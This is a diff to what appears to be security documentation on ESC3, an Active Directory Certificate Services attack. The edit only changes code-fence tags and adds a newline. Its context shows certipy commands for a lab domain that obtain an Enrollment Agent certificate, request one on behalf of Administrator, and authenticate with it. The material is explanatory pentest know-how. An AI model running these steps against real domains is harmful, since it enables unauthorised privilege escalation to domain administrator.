@@ -25,7 +25,7 @@ ESC3 exploits weaknesses related to *certificate requests agents*. also known as
 **Step 1: Obtain an Enrollment Agent certificate:**
 The attacker (`attacker@lol.local`) enrolls for a certificate from the misconfigured `ESC3` template (or an ESC2 "Any Purpose" template).
 
-```bash
+```shell
 certipy req \
     -u 'attacker@lol.local' -p 'attacker' \
     -dc-ip '10.10.111.10' -target 'DC01.LOL.LOCAL' \
@@ -36,7 +36,7 @@ This command requests a certificate for `attacker@lol.local` using the `EnrollAg
 **Step 2: Use the Enrollment Agent certificate to request a certificate on behalf of the target user:** 
 The attacker uses their `attacker.pfx` (their agent certificate obtained in Step 1) to request a certificate from the `User` template (or another suitable agent-enrollable target template) on behalf of `LOL\Administrator`.
 
-```bash
+```shell
 certipy req \
     -u 'attacker@lol.local' -p 'attacker' \
     -dc-ip '10.10.111.10' -target 'DC01.LOL.LOCAL' \
@@ -62,3 +62,4 @@ The attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate a
 ```shell
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.111.10'
 ```
+
